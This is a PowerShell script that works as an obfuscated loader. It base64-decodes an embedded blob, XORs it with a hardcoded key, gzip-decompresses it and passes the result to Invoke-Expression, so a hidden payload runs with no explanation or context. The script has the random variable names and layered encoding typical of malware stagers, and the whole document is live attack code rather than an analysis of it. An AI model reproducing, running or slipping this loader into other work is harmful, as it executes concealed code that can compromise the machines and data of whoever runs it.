$jq2y13vf7k96n4c = [System.Text.Encoding]::ASCII.GetBytes("g83wljmukoic")

function u1lpi5kb86ma7t2synxwj9q3ezh {
    param($js0hfx1m8vl4qgy)
    $6yorbd8xcihuw9q = [System.Convert]::FromBase64String($js0hfx1m8vl4qgy)
    $lvu105oy2g46is9 = $jq2y13vf7k96n4c

    $w5lg3krfdvmz867 = $(for ($ry0qt2wahxfzl5c = 0; $ry0qt2wahxfzl5c -lt $6yorbd8xcihuw9q.length;) {
        for ($4mo6ja37v9xc5er = 0; $4mo6ja37v9xc5er -lt $lvu105oy2g46is9.length; $4mo6ja37v9xc5er++) {
            $6yorbd8xcihuw9q[$ry0qt2wahxfzl5c] -bxor $lvu105oy2g46is9[$4mo6ja37v9xc5er]
            $ry0qt2wahxfzl5c++

            if ($ry0qt2wahxfzl5c -ge $6yorbd8xcihuw9q.Length) {
                $4mo6ja37v9xc5er = $lvu105oy2g46is9.length
            }
        }
    })

    $hd26lnj4a5s1x89 = New-Object System.IO.MemoryStream(,$w5lg3krfdvmz867)
    $0nd7v621wf4a93u = New-Object System.IO.MemoryStream
    $miavdhspc4fjk01 = New-Object System.IO.Compression.GzipStream($hd26lnj4a5s1x89, [IO.Compression.CompressionMode]::Decompress)
    $miavdhspc4fjk01.CopyTo($0nd7v621wf4a93u)
    $miavdhspc4fjk01.Close()
    $hd26lnj4a5s1x89.Close()

    [byte[]] $h2ijmzq91kwlupc = $0nd7v621wf4a93u.ToArray()
    $rh2smyuve3co58a = $h2ijmzq91kwlupc

    return $rh2smyuve3co58a
}

[byte[]] $7pgiyfkw0l6q5nx = u1lpi5kb86ma7t2synxwj9q3ezh("eLM7d2xqbXVvb+Q2vEqQT3wXM9+TaPzpytjGN/2yHBv+aFIgdff17jA2VsaAJiSqR3gCwGQLTSyUlF3Uo4nUVjxvxaBREpMXLPChe9v56+MLPuFx/AFA4bZDL1rZ64npbh+y3WDg5bqGrLUBOaIuShEoJzXueLD+vXN6//cQQzTMBx88Q7o1jfiML0IoRNs6jwYvaP+uDznUzws3b6Kbrwvcjg+Y/4stLpl3FmI4dinPvk7nPkpbYLJ4Gm9ZOsFuTSc6DkNSNaG9gEVp8Kw4h1SNPEVJZnSXfK9+gyL5jd+Ox9mjWdQOkOJRMmWE7xZfhBXbYfzNwzKRb83LKfxydTJyIhdETDeNW8PIYaBySh2gxZAB7LXdpLx/s3yBz1yqDexNZ2F0JJoLFv04nKwE3/e8Z8DCiUK5wW+EjGKVGs+nWZBdR1WtdP18EcNildli34mNrBFVMkCg+U9Nuu7X3aYI5gR+CzL36tzs2DXXYO6kOrzeyN6GHRLeRq5OIlbPWAEmXmM1LBACSta8yNsDZqidCJzO8THcDCBqJVRjAJI/KrMAo3qX3Sq0XgF28S5+s30ZRZ6UA0y1cN+AJg0N952VZf0BGOlzYnAI/L46zahWa59ctvP/hWQVPQvFVcExJklRVVAe52BxQeYqe+N353MfEVkgrqsFN8f5nuOgsodyYiwrZUKJ5BU7TwPRVFOujrYfBnYuJt9aP3k2F2tABZ+JQkglGcLGWSsj0K4ATgHakaUBO3ZUa3oASFc5YQv0cvYRRJCrvgvzWITDKJt1CMwUYkypzknja+pdvXAadHVIgnaBwEw4dAUHUCTS2CLOTP0ezCVl0/wGBLpBwXAQPi7p1CpLsx2nnxMvNi2mBOcrfpwQgeuX7a1N30Gw95TsojYLN4/y1JWvfbqLVNvnZX1Fue+NSL1L5gMz97rPxmhBDEAQBJRGmIH/NxabFsJgyQO1zbyqAkpok4wPe3ZFeg8YBgvVd5ysqL9QlEbZQ1u2ENb8uqLluo8IXwHmRJqNsSDsUrNFsJkEnLjfUX/1E/QzkJ66l2vc+t+BYytziPwsEnbmU+v1N4fsKkT3pSw4ZrR4aZwot0BbLLGvBP6y3ylFzMXEqqiGsk7xLUqPSD6IH3BOz84eF/+Mqifh9GOpTGgusVJ+ZQgIDgaMQEiDN5tMj2zMKyli4OR+dOzXD6Uk0GI2CIBZBN4QKuu/yTZp0ICcKGtqbQ==")) | iex